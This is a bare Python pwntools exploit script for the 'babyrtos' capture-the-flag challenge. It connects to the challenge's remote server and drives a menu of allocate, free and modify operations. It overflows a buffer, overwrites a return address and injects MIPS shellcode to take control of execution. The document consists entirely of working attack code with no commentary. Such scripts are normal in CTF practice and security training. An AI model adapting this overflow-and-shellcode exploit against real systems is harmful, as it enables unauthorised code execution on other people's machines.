#!/usr/bin/env python3
from pwn import *

exe = ELF("./a.out")
context.binary = exe

def conn():
    #return process("bash run.sh",shell=True)
    return remote("babyrtos.2021.3k.ctf.to",7777)

r = conn()

def alloc(index, name):
    r.sendlineafter("> ", "1")
    r.sendlineafter("> ", str(index))
    r.sendlineafter("Enter the name: ", name)

def free(index):
    r.sendlineafter("> ", "2")
    r.sendlineafter("> ", str(index))

def modify(index, new_name):
    r.sendlineafter("> ", "3")
    r.sendlineafter("> ", str(index))
    r.sendlineafter(": ", new_name)


def main():
    alloc(0, "M"*0x100)
    alloc(1, "A"*0x100)
    modify(0, "\xff"*0x101)
    shellcode = b"\x00"*10
    f ='lui     $v0, 0x9FC2\n'
    f+='addiu   $a0, $v0, -0x6d40\n'
    f+='lui    $ra, 0x9fc0\n'
    f+='ori    $ra, $ra, 0xf48\n'
    f+="jal $ra\n"
    shellcode+= asm(f)
    RA=p32(0x80004d6a+2) 
    modify(0, b"a"*268+RA+b"A"*(0x1ff-271-len(shellcode))+shellcode)
    free(1)
    r.interactive()
    
if __name__ == "__main__":
    main()